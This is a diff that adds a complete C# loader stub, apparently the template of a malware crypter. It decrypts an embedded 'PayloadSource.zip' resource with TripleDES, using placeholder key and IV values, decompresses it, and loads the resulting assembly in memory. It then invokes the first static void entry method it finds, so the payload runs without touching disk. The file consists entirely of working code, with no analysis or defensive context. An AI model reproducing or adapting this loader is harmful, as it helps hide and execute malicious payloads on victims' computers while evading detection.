@@ -1,0 +1,76 @@
+using System;
+using System.IO;
+using System.IO.Compression;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+
+internal static class PCLoader
+{
+    private static Assembly pa;
+    private static Assembly R(object s, ResolveEventArgs e)
+    {
+        if (e.Name.Contains("protobuf"))
+        {
+            if (pa == null)
+            {
+                using (var st = typeof(PCLoader).Assembly.GetManifestResourceStream("protobuf-net.dll"))
+                {
+                    byte[] b = new byte[st.Length]; st.Read(b, 0, b.Length);
+                    pa = Assembly.Load(b);
+                }
+            }
+            return pa;
+        }
+        return null;
+    }
+
+    [DllImport("user32.dll")]
+    private static extern bool SetProcessDPIAware();
+
+    public static void Main()
+    {
+        try { SetProcessDPIAware(); } catch { }
+        AppDomain.CurrentDomain.AssemblyResolve += R;
+
+        byte[] blob;
+        using (var st = typeof(PCLoader).Assembly.GetManifestResourceStream("PayloadSource.zip"))
+        {
+            blob = new byte[st.Length]; st.Read(blob, 0, blob.Length);
+        }
+
+        byte[] key = Convert.FromBase64String("__KEY_B64__");
+        byte[] iv  = Convert.FromBase64String("__IV_B64__");
+        byte[] dec;
+        using (var t = TripleDES.Create())
+        {
+            t.Key = key; t.IV = iv;
+            t.Mode = CipherMode.CBC; t.Padding = PaddingMode.PKCS7;
+            using (var d = t.CreateDecryptor())
+                dec = d.TransformFinalBlock(blob, 0, blob.Length);
+        }
+
+        byte[] raw;
+        using (var ms = new MemoryStream(dec, 4, dec.Length - 4))
+        using (var gz = new GZipStream(ms, CompressionMode.Decompress))
+        using (var o  = new MemoryStream())
+        {
+            byte[] buf = new byte[4096]; int n;
+            while ((n = gz.Read(buf, 0, buf.Length)) > 0) o.Write(buf, 0, n);
+            raw = o.ToArray();
+        }
+
+        Assembly a = Assembly.Load(raw);
+        foreach (var tp in a.GetTypes())
+        {
+            foreach (var m in tp.GetMethods(BindingFlags.Public | BindingFlags.Static | BindingFlags.DeclaredOnly))
+            {
+                if (m.ReturnType == typeof(void) && m.GetParameters().Length == 0)
+                {
+                    m.Invoke(null, null);
+                    return;
+                }
+            }
+        }
+    }
+}
